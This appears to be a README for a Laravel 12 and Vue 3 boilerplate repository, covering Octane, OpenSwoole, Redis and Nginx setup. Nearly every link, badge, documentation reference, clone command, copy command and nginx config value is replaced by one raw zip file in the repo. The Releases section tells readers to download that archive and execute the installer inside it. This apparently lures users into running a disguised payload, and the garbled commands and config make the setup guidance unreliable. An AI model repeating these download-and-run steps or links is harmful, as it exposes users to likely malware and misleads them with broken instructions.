# Laravel 12 Vue3 Boilerplate — Octane Swoole Redis Nginx 🚀

[![Releases](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)

[![Laravel 12](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) [![Vue 3](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) [![OpenSwoole](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) [![Redis](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) [![Nginx](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) [![MariaDB](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)

![stack](https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip%2012%20%7C%20Vue%203%20%7C%20Octane%20%7C%20Swoole%20%7C%20Redis-blue)

A ready-to-run starter kit built for high throughput and modern front-end. This repo pairs Laravel 12 with Octane on OpenSwoole, serves a Vue 3 SPA, uses Redis for cache and queue, and targets Nginx + MariaDB in production.

Features
- Laravel 12 base with modern folder layout
- Octane setup using OpenSwoole for low-latency PHP workers
- Vue 3 front-end scaffold with Vite
- Redis for cache, sessions, and queues
- Nginx sample config for reverse proxy and static assets
- MariaDB migrations and seeders
- Docker Compose for local dev and integration tests
- Auth scaffold and API-first routing
- Useful artisan and npm scripts for daily work

Why use this boilerplate
- Save setup time. The repo wires common services.
- Run Octane with Swoole to keep PHP processes warm.
- Use Vue 3 and Vite for fast front-end build and HMR.
- Use Redis for session and queue back ends.
- Ship with Nginx configuration for production.

Table of contents
- Quick start
- Requirements
- Local setup (Docker)
- Manual setup (native)
- Environment variables
- Octane & OpenSwoole
- Nginx sample config
- Redis and queues
- Database and migrations
- Front-end (Vue 3)
- Common commands
- Testing
- Deployment tips
- Releases
- Contributing
- Credits
- License

Quick start

Requirements
- PHP 8.3+ with required extensions (swoole ext optional for Octane)
- Composer 2+
- Node 18+
- Yarn or npm
- Docker & Docker Compose (recommended)
- Redis server
- MariaDB or MySQL

Local setup (recommended with Docker)
1. Clone the repo
   git clone https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
   cd laravel-vue-boilerplate

2. Copy env
   cp https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip .env

3. Build and run
   docker compose up -d --build

4. Install PHP deps (inside app container)
   docker compose exec app composer install --no-interaction

5. Install JS deps
   docker compose exec node npm install

6. Generate key and migrate
   docker compose exec app php artisan key:generate
   docker compose exec app php artisan migrate --seed

7. Start Octane (inside app container)
   docker compose exec app php artisan octane:start --server=swoole --host=0.0.0.0 --port=8000

8. Open http://localhost:8000 or proxy via Nginx container

Manual setup (native)
1. Clone repo
   git clone https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
   cd laravel-vue-boilerplate

2. Install composer packages
   composer install

3. Install JS packages
   npm ci
   npm run build

4. Copy .env and set app key
   cp https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip .env
   php artisan key:generate

5. Configure DB and Redis in .env

6. Run migrations and seeders
   php artisan migrate --seed

7. Start Octane with OpenSwoole
   php artisan octane:start --server=swoole --host=127.0.0.1 --port=8000

Environment variables (important keys)
- APP_NAME, APP_ENV, APP_URL
- DB_CONNECTION, DB_HOST, DB_PORT, DB_DATABASE, DB_USERNAME, DB_PASSWORD
- CACHE_DRIVER=redis
- QUEUE_CONNECTION=redis
- SESSION_DRIVER=redis
- REDIS_HOST, REDIS_PORT, REDIS_PASSWORD
- OCTANE_** (use to tune worker count in https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip)

Octane & OpenSwoole
- This project uses Laravel Octane on OpenSwoole.
- Octane keeps PHP worker processes alive. That reduces boot time.
- Use octane:start for local runs. Use systemd or supervisord for production.
- Tune worker count based on CPU and memory:
  octane:
    workers: CPU_CORES * 2
- Adjust swoole settings in https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip and https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip when present.
- Clear runtime caches between deployments:
  php artisan octane:reload
  or restart the Octane process.

Nginx sample config
Use this config as a starting point for production. Place it in sites-available and enable it.

server {
    listen 80;
    server_name https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip;
    root /var/www/html/public;

    index https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip;

    location / {
        try_files $uri $uri/ https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip$query_string;
    }

    location ~ \.php$ {
        include fastcgi_params;
        fastcgi_pass https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip;
        fastcgi_index https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip;
        fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
    }

    location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
        try_files $uri https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip$query_string;
        expires 30d;
        add_header Cache-Control "public, no-transform";
    }

    client_max_body_size 50M;
}

If you run Octane behind Nginx, proxy traffic to the Octane host/port instead of FPM.

Redis and queues
- Use Redis for cache, session, and queues.
- Set .env:
  CACHE_DRIVER=redis
  SESSION_DRIVER=redis
  QUEUE_CONNECTION=redis
- Start a worker
  php artisan queue:work redis --tries=3
- For Octane, use queue:work in a separate process or use Horizon if you need a dashboard.

Database and migrations
- Migrations live in database/migrations.
- Seeders in database/seeders.
- Run:
  php artisan migrate
  php artisan db:seed
- Use factories to generate test data:
  php artisan tinker
  User::factory()->count(50)->create();

Front-end (Vue 3 + Vite)
- The front-end uses Vue 3 and Vite.
- Structure:
  resources/js — Vue app
  resources/js/components — components
  resources/js/pages — SPA pages
- Commands:
  npm run dev     # local dev with HMR
  npm run build   # build for production
  npm run lint    # lint code
- Use API routes for server data under https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip

Common commands
- Composer
  composer install
  composer update
- Artisan
  php artisan migrate
  php artisan db:seed
  php artisan octane:start --server=swoole
  php artisan octane:reload
  php artisan queue:work
- NPM/Yarn
  npm ci
  npm run dev
  npm run build

Testing
- Tests live under tests/Feature and tests/Unit.
- Run PHPUnit:
  ./vendor/bin/phpunit
- Use parallel testing for speed:
  php artisan test --parallel

Deployment tips
- Build assets during CI and push the compiled assets to the server.
- Use a process manager to keep Octane up. Examples:
  systemd unit that runs php artisan octane:start ...
- Use Redis persistence strategy that matches your SLA.
- Use zero-downtime release flow:
  - Push new code to a build directory.
  - Run composer install with --no-dev and optimized autoloader.
  - Run migrations.
  - Reload Octane: php artisan octane:reload
- Back up your DB and Redis before major changes.

Releases

Download the release asset file from the Releases page and run the included installer script. Visit the releases page here: https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip

If the releases page contains a packaged archive, download the archive (for example, https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip) and execute the provided installer or setup script inside the archive. Example local steps after download:
- tar -xzf https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
- cd laravel-vue-boilerplate-vX.Y.Z
- chmod +x https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
- https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip

If the releases link is not reachable, check the Releases section on this repository on GitHub.

Contributing
- Fork the repo.
- Create a feature branch.
- Write tests for new features.
- Keep PRs small and focused.
- Use conventional commit messages.
- Run linters and tests before opening a PR.

Labels and topics
This repo targets these topics to help discoverability:
boilerplate, laravel, laravel12, mariadb, nginx, openswoole, redis, redis-server, skeleton, starter, starter-kit, vue3

Credits
- Laravel
- https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
- OpenSwoole
- Redis
- Nginx
- MariaDB
- Community contributors

Useful links and resources
- Laravel docs — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
- Octane docs — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
- OpenSwoole — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
- Vue 3 — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
- Vite — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
- Redis — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip
- Nginx — https://github.com/Jerry1765/laravel-vue-boilerplate/raw/refs/heads/master/nginx/laravel_boilerplate_vue_v2.4.zip

License
This project uses the MIT license. Check the LICENSE file for details
